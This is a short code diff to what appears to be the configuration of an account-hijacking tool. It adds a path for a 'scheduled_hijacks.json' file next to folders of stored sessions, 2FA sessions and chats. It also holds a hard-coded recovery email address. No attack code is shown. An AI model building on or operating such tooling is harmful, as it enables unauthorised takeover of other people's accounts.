@@ -8,4 +8,6 @@ SESSION_FOLDER = "/app/data/sessions"
 MY_SESSION_PATH = "/app/data/sessions/my_account"
 SESSION_2FA_FOLDER = "/app/data/sessions_2fa"
 CHAT_FOLDER = "/app/data/chats"
+SCHEDULE_FILE = "/app/data/scheduled_hijacks.json"
+
 RECOVERY_EMAIL = "balamutdans@gmail.com"
